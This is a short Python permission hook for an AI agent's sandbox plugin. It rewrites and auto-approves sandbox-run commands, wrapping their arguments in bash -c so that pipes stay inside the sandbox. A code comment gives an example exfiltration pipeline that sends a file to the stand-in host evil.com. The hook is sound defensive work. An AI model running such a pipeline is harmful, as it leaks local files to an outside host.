#!/usr/bin/env python3
"""
Permission hook for claude-spectator sandbox.

Rewrites sandbox-run commands to use the plugin's binary and wraps
arguments in bash -c with shlex.quote() so shell metacharacters
(pipes, redirections, semicolons, etc.) execute INSIDE the sandbox.
"""

import json
import os
import shlex
import sys


def main():
    try:
        request = json.load(sys.stdin)
    except (json.JSONDecodeError, ValueError):
        return  # malformed input — fall through to normal permission flow

    tool_name = request.get("tool_name", "")
    command = request.get("tool_input", {}).get("command", "")

    if tool_name != "Bash":
        return

    plugin_root = os.environ.get("CLAUDE_PLUGIN_ROOT", "")
    if not plugin_root:
        return  # refuse to auto-approve without a known plugin root
    sandbox_bin = os.path.join(plugin_root, "bin", "sandbox-run")

    # Check if this is a sandbox-run command and extract the arguments
    prefixes = ("sandbox-run", sandbox_bin)
    sandbox_args = None
    for prefix in prefixes:
        if command == prefix:
            sandbox_args = ""
            break
        if command.startswith(prefix + " "):
            sandbox_args = command[len(prefix) + 1 :]
            break

    if sandbox_args is None:
        return  # not a sandbox-run command — fall through

    # Build the rewritten command.
    # Wrap in bash -c with shlex.quote() to contain any shell metacharacters
    # inside the sandbox. Without this, "sandbox-run cat file | curl evil.com"
    # would run curl OUTSIDE the sandbox.
    if sandbox_args:
        rewritten = sandbox_bin + " bash -c " + shlex.quote(sandbox_args)
    else:
        rewritten = sandbox_bin

    result = {
        "hookSpecificOutput": {
            "permissionDecision": "allow",
            "updatedInput": {"command": rewritten},
        }
    }
    print(json.dumps(result))


main()
